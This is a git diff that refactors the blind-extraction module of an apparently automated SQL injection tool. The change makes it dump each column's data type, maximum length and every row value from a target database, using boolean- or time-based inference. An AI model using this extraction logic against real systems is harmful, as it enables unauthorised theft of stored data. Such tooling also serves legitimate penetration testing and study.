@@ -7,7 +7,10 @@ from utils.constants import (
     HEIGH_COL_VALUE_LENGTH,
     HEIGH_ELEMENT_COUNT,
     HEIGH_ELEMENT_NAME_LENGTH,
+    HEIGH_MAX_CHAR_LENGTH,
+    NUMERIC_TYPES,
     RESET,
+    STRING_TYPES,
     YELLOW,
     InjectionContext,
     fingerprints,
@@ -51,22 +54,14 @@ class BlindExtractor:
         """
 
         get_chars = (
-            self.boolean.get_db_elem_name_chars_at_index
+            self.boolean.get_string_chars_at_index
             if boolInjection
-            else self.time.get_db_elem_name_chars_at_index
+            else self.time.get_string_chars_at_index
         )
 
-        get_number = (
-            self.boolean.get_number_returned_by_sql
-            if boolInjection
-            else self.time.get_number_returned_by_sql
-        )
+        get_number = self.boolean.get_number if boolInjection else self.time.get_number
 
-        get_name = (
-            self.boolean.get_db_elem_name
-            if boolInjection
-            else self.time.get_db_elem_name
-        )
+        get_string = self.boolean.get_string if boolInjection else self.time.get_string
 
         # Test if we can get the element's name included in the injection's response body
         body_containing_name = self.union.test_expressions_name(
@@ -92,7 +87,7 @@ class BlindExtractor:
 
         # Better simply compute for each character if length is short
         if name_length < 5:
-            return get_name(self.database_engine, param, ctx, expression, name_length)
+            return get_string(self.database_engine, param, ctx, expression, name_length)
 
         if body_containing_name:
             # Find the first and the last character in the database element's name
@@ -151,7 +146,7 @@ class BlindExtractor:
                         return corresponding_names[0]
                     # Compute each character to find out the whole name
 
-        return get_name(self.database_engine, param, ctx, expression, name_length)
+        return get_string(self.database_engine, param, ctx, expression, name_length)
 
     def dump_db_elem_entries(
         self,
@@ -164,25 +159,22 @@ class BlindExtractor:
         frm: str,
         where: str,
         limit: str,
+        data_type: str = "varchar",
     ) -> list[str]:
         """
         Get the number of entries that the database element (table, column) has,
-        then create a loop in which each entry name is found by binary search.
-        All entry names are finally returned as a list.
+        then create a loop in which each entry is found by binary search.
+        All entries are finally returned as a list.
         """
         results = []
 
-        # Get the number of database element's entries on the database
         db_elem_count_expression = f"(SELECT COUNT(*) {frm} {where})"
 
         Logger.info(db_elem_count_expression)
 
-        get_number = (
-            self.boolean.get_number_returned_by_sql
-            if boolInjection
-            else self.time.get_number_returned_by_sql
-        )
+        get_number = self.boolean.get_number if boolInjection else self.time.get_number
 
+        # Get the number of database element's entries on the database
         db_elem_count = get_number(
             param, ctx, db_elem_count_expression, HEIGH_ELEMENT_COUNT
         )
@@ -204,19 +196,25 @@ class BlindExtractor:
                 {where}
                 {limit_expression2}
             """
+            print("datatypeeee:", data_type.lower())
+            if data_type.lower() in STRING_TYPES:
+                db_elem_name = self.find_db_elem_name(
+                    param,
+                    ctx,
+                    boolInjection,
+                    db_elem,
+                    expression,
+                    union_expression,
+                )
+            elif data_type.lower() in NUMERIC_TYPES:
+                db_elem_name = get_number(param, ctx, expression, 2000)
+            else:
+                db_elem_name = "-"
 
-            db_elem_name = self.find_db_elem_name(
-                param,
-                ctx,
-                boolInjection,
-                db_elem,
-                expression,
-                union_expression,
-            )
             if db_elem_name:
                 results.append(db_elem_name)
                 Logger.success(
-                    f"Found {db_elem} name #{elem + 1}: {YELLOW}{db_elem_name}{RESET}\n"
+                    f"Found {db_elem} string #{elem + 1}: {YELLOW}{db_elem_name}{RESET}\n"
                 )
 
         return results
@@ -298,7 +296,8 @@ class BlindExtractor:
                     for col in column_names:
                         sql_col_name = string_to_sql_char(col)
 
-                        data_types = self.dump_db_elem_entries(
+                        # Data type of the column
+                        data_type = self.dump_db_elem_entries(
                             param,
                             ctx,
                             column_count,
@@ -310,22 +309,31 @@ class BlindExtractor:
                             f"AND table_name = {sql_table_name} "
                             f"AND column_name = {sql_col_name}",
                             fingerprints[self.database_engine.lower()].limit,
+                        )[0]
+
+                        get_number = (
+                            self.boolean.get_number
+                            if boolInjection
+                            else self.time.get_number
                         )
 
-                        character_maximum_lengths = self.dump_db_elem_entries(
-                            param,
-                            ctx,
-                            column_count,
-                            boolInjection,
-                            "value",
-                            "SELECT character_maximum_length",
-                            "FROM information_schema.columns",
-                            f"WHERE table_schema = {sql_db_name} "
-                            f"AND table_name = {sql_table_name} "
-                            f"AND column_name = {sql_col_name}",
-                            fingerprints[self.database_engine.lower()].limit,
+                        # The maximum character length of the values in the column
+                        character_maximum_length = (
+                            get_number(
+                                param,
+                                ctx,
+                                "(SELECT character_maximum_length "
+                                "FROM information_schema.columns "
+                                f"WHERE table_schema = {sql_db_name} "
+                                f"AND table_name = {sql_table_name} "
+                                f"AND column_name = {sql_col_name})",
+                                HEIGH_MAX_CHAR_LENGTH,
+                            )
+                            if data_type.lower() in STRING_TYPES
+                            else None
                         )
 
+                        # All the values in the columns
                         values = self.dump_db_elem_entries(
                             param,
                             ctx,
@@ -336,15 +344,12 @@ class BlindExtractor:
                             f"FROM `{db_name}`.`{table}`",
                             "",
                             fingerprints[self.database_engine.lower()].limit,
+                            data_type,
                         )
 
                         dump[db_name][table][col] = {
-                            "data_type": data_types[0] if data_types else None,
-                            "character_maximum_length": (
-                                character_maximum_lengths[0]
-                                if character_maximum_lengths
-                                else None
-                            ),
+                            "data_type": data_type if data_type else None,
+                            "character_maximum_length": character_maximum_length,
                             "values": values,
                         }
         return dump
@@ -395,7 +400,7 @@ class BlindExtractor:
                 sql_column = string_to_sql_char(column)
 
                 # Get the declared SQLite type.
-                data_types = self.dump_db_elem_entries(
+                data_type = self.dump_db_elem_entries(
                     param,
                     ctx,
                     column_count,
@@ -405,7 +410,7 @@ class BlindExtractor:
                     f"FROM pragma_table_info({sql_table})",
                     f"WHERE name = {sql_column}",
                     fingerprints[self.database_engine.lower()].limit,
-                )
+                )[0]
 
                 # Get the actual column values.
                 values = self.dump_db_elem_entries(
@@ -418,12 +423,13 @@ class BlindExtractor:
                     f'FROM "{table}"',
                     "",
                     fingerprints[self.database_engine.lower()].limit,
+                    data_type,
                 )
 
                 # SQLite does not have an equivalent to
                 # information_schema.columns.character_maximum_length.
                 dump["main"][table][column] = {
-                    "data_type": data_types[0] if data_types else None,
+                    "data_type": data_type if data_type else None,
                     "character_maximum_length": None,
                     "values": values,
                 }
@@ -484,8 +490,7 @@ class BlindExtractor:
                     "column",
                     "SELECT COLUMN_NAME",
                     "FROM INFORMATION_SCHEMA.COLUMNS",
-                    f"WHERE TABLE_CATALOG = '{db_name}' "
-                    f"AND TABLE_NAME = '{table}'",
+                    f"WHERE TABLE_CATALOG = '{db_name}' AND TABLE_NAME = '{table}'",
                     fingerprints[self.database_engine.lower()].limit.format(
                         element="COLUMN_NAME"
                     ),
@@ -493,7 +498,7 @@ class BlindExtractor:
 
                 for col in column_names:
                     # Data type
-                    data_types = self.dump_db_elem_entries(
+                    data_type = self.dump_db_elem_entries(
                         param,
                         ctx,
                         column_count,
@@ -507,23 +512,27 @@ class BlindExtractor:
                         fingerprints[self.database_engine.lower()].limit.format(
                             element="DATA_TYPE"
                         ),
+                    )[0]
+
+                    get_number = (
+                        self.boolean.get_number
+                        if boolInjection
+                        else self.time.get_number
                     )
 
-                    # Character maximum length
-                    character_maximum_lengths = self.dump_db_elem_entries(
-                        param,
-                        ctx,
-                        column_count,
-                        boolInjection,
-                        "value",
-                        "SELECT CHARACTER_MAXIMUM_LENGTH",
-                        "FROM INFORMATION_SCHEMA.COLUMNS",
-                        f"WHERE TABLE_CATALOG = '{db_name}' "
-                        f"AND TABLE_NAME = '{table}' "
-                        f"AND COLUMN_NAME = '{col}'",
-                        fingerprints[self.database_engine.lower()].limit.format(
-                            element="CHARACTER_MAXIMUM_LENGTH"
-                        ),
+                    character_maximum_lengths = (
+                        get_number(
+                            param,
+                            ctx,
+                            "(SELECT CHARACTER_MAXIMUM_LENGTH "
+                            "FROM INFORMATION_SCHEMA.COLUMNS "
+                            f"WHERE TABLE_CATALOG = '{db_name}' "
+                            f"AND TABLE_NAME = '{table}' "
+                            f"AND COLUMN_NAME = '{col}')",
+                            HEIGH_MAX_CHAR_LENGTH,
+                        )
+                        if data_type.lower() in STRING_TYPES
+                        else None
                     )
 
                     # Values
@@ -544,12 +553,13 @@ class BlindExtractor:
                         fingerprints[self.database_engine.lower()].limit.format(
                             element=f"[{col}]"
                         ),
+                        data_type,
                     )
 
                     dump[db_name][table][col] = {
-                        "data_type": data_types[0] if data_types else None,
+                        "data_type": data_type if data_type else None,
                         "character_maximum_length": (
-                            character_maximum_lengths[0]
+                            character_maximum_lengths
                             if character_maximum_lengths
                             else None
                         ),
